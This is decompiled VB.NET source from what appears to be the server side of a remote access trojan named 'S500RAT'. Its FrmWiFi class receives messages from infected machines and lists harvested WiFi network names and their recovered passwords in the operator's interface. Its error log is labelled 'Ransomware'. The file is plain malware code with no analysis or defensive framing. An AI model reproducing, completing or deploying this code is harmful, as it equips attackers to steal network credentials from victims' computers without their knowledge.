Imports System
Imports System.Diagnostics
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x02000061 RID: 97
	Public Class FrmWiFi
		' Token: 0x060011C0 RID: 4544 RVA: 0x0009E2AC File Offset: 0x0009C4AC
		Public Sub AddArrary(client As Clients, unpack_msgpack As MsgPack)
			' The following expression was wrapped in a checked-statement
			Try
				Dim formWiFi As FormWiFi = CType(Application.OpenForms("FormWiFi" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormWiFi)
				Dim flag As Boolean = formWiFi Is Nothing
				If flag Then
					Debug.WriteLine("Error")
					client.Disconnected()
				Else
					Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
					If Operators.CompareString(asString, "setClient", False) = 0 Then
						Dim flag2 As Boolean = formWiFi IsNot Nothing
						If flag2 Then
							Dim flag3 As Boolean = formWiFi.Client Is Nothing
							If flag3 Then
								formWiFi.Client = client
								formWiFi.Timer1.Enabled = True
							End If
						End If
						Dim flag4 As Boolean = formWiFi IsNot Nothing
						If flag4 Then
							Try
								formWiFi.ListWifi.Rows.Clear()
								Dim asString2 As String = unpack_msgpack.ForcePathObject("Message").AsString
								Dim array As String() = asString2.Split(New String() { "-=>" }, StringSplitOptions.None)
								Dim num As Integer = array.Length - 1
								For i As Integer = 0 To num
									Dim flag5 As Boolean = array(i).Length > 0
									If flag5 Then
										Dim flag6 As Boolean = Operators.CompareString(array(i + 1), "Not Found!", False) <> 0
										If flag6 Then
											formWiFi.ListWifi.Rows.Add(New Object() { formWiFi.ImageList1.Images("True.png"), array(i), array(i + 1) })
										Else
											formWiFi.ListWifi.Rows.Add(New Object() { formWiFi.ImageList1.Images("False.png"), array(i), array(i + 1) })
										End If
									End If
									i += 1
								Next
								formWiFi.WifiNum.Text = "WiFi [ " + Conversions.ToString(Conversions.ToInteger(formWiFi.ListWifi.Rows.Count)) + " ]"
							Catch ex As Exception
							End Try
						End If
					End If
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("Ransomware " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
